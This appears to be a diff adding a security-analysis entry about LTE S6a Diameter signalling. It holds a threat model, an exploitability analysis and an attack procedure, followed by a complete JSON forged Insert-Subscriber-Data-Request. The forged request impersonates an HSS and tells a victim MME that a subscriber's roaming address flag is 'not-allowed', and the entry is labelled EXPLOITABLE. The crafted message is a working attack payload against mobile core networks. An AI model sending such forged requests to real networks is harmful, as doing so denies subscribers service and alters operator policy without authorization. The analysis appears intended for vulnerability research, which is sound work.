@@ -1,0 +1,102 @@
+### **Threat Model:**
+- **Attack Assumption:**
+  - The victim is an **MME** exposing its **S6a Diameter** service. An Internet attacker can impersonate the **HSS** and send a forged **Insert-Subscriber-Data-Request (IDR)** to that MME. The MME accepts the request as authoritative subscriber-profile input for the targeted UE.
+
+- **Attacker Capability:**
+  - The attacker can open its own Diameter connection to the MME, send crafted **IDR Requests**, and receive the corresponding answers. The attacker does not observe or alter legitimate HSS<->MME traffic and has no extra NAS/GTP/radio capabilities. The attacker knows the target subscriber identity (for example, IMSI in `User-Name`).
+
+### **Exploitability Analysis:**
+`Subscription-Data.APN-Configuration-Profile.APN-Configuration.VPLMN-Dynamic-Address-Allowed` is a **3GPP vendor-specific leaf AVP** inside the subscriber's APN profile for a specific `APN-Configuration` instance. In an **IDR Request** from HSS to MME, it is not descriptive metadata; it is **authoritative provisioning state** that the MME may cache and later use for PDN connectivity handling.
+
+Field-specifically, changing this AVP can alter one concrete policy decision: whether the targeted APN may be used with **dynamic address allocation in a visited PLMN**. If a forged IDR sets the field from **allowed** to **not allowed**, the MME may later refuse or fail PDN establishment for that APN under roaming conditions where dynamic VPLMN addressing is relevant. If that APN is the subscriber's default or otherwise required APN, this can cause subscriber-visible service denial on later attach/PDN setup. Conversely, changing it from **not allowed** to **allowed** can improperly permit a roaming session mode that the real HSS policy intended to forbid.
+
+This is therefore more than "forged IDR is bad in general." The target AVP itself is the control point for a **specific roaming/address-allocation authorization rule** within one APN profile entry. The effect is narrower than broader APN-profile corruption, and usually realized only on a later PDN establishment or re-establishment event, but it is still a concrete field-driven policy change that the MME can store and enforce.
+
+The impact is conditional: it mainly matters when the UE is roaming in a VPLMN and the selected APN/session path involves dynamic visited-PLMN addressing. A later legitimate HSS update, re-registration, or context refresh can overwrite the poisoned value, but until then the cached subscriber profile may remain misconfigured.
+
+### **Attack Procedure:**
+Send a forged **S6a Insert-Subscriber-Data-Request** from the attacker-controlled Diameter connection to the victim MME, targeting the subscriber via `User-Name`. Include `Subscription-Data` with an `APN-Configuration-Profile` containing an `APN-Configuration` identified by `Context-Identifier` and `Service-Selection`, and set `VPLMN-Dynamic-Address-Allowed` to the malicious value, typically **not-allowed** for denial impact.
+
+A minimally coherent request should include the normal Diameter routing/session AVPs, the 3GPP S6a/S6d `Vendor-Specific-Application-Id`, `User-Name`, and the grouped ancestors required to legally carry the target AVP. The expected success condition is that the MME accepts the IDR, updates the subscriber's cached APN profile, and later denies or alters PDN establishment for that APN in roaming conditions consistent with the poisoned flag.
+
+### **Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": "319",
+    "application_id": "16777251",
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "name": "Session-Id",
+      "value": "attacker-hss.example.net;1735689600;1"
+    },
+    {
+      "name": "Vendor-Specific-Application-Id",
+      "value": {
+        "Vendor-Id": 10415,
+        "Auth-Application-Id": 16777251
+      }
+    },
+    {
+      "name": "Auth-Session-State",
+      "value": 1
+    },
+    {
+      "name": "Origin-Host",
+      "value": "hss.attacker.example.net"
+    },
+    {
+      "name": "Origin-Realm",
+      "value": "attacker.example.net"
+    },
+    {
+      "name": "Destination-Host",
+      "value": "mme01.victim.example"
+    },
+    {
+      "name": "Destination-Realm",
+      "value": "victim.example"
+    },
+    {
+      "name": "User-Name",
+      "value": "001010123456789"
+    },
+    {
+      "name": "Subscription-Data",
+      "vendor_id": 10415,
+      "value": {
+        "APN-Configuration-Profile": {
+          "Context-Identifier": 1,
+          "All-APN-Configurations-Included-Indicator": 0,
+          "APN-Configuration": [
+            {
+              "Context-Identifier": 1,
+              "Service-Selection": "internet",
+              "PDN-Type": 0,
+              "EPS-Subscribed-QoS-Profile": {
+                "QoS-Class-Identifier": 9,
+                "Allocation-Retention-Priority": {
+                  "Priority-Level": 15,
+                  "Pre-emption-Capability": 1,
+                  "Pre-emption-Vulnerability": 0
+                }
+              },
+              "AMBR": {
+                "Max-Requested-Bandwidth-UL": 1000000,
+                "Max-Requested-Bandwidth-DL": 1000000
+              },
+              "VPLMN-Dynamic-Address-Allowed": "not-allowed"
+            }
+          ]
+        }
+      }
+    }
+  ]
+}
+```
+
+### **Classification:**
+EXPLOITABLE
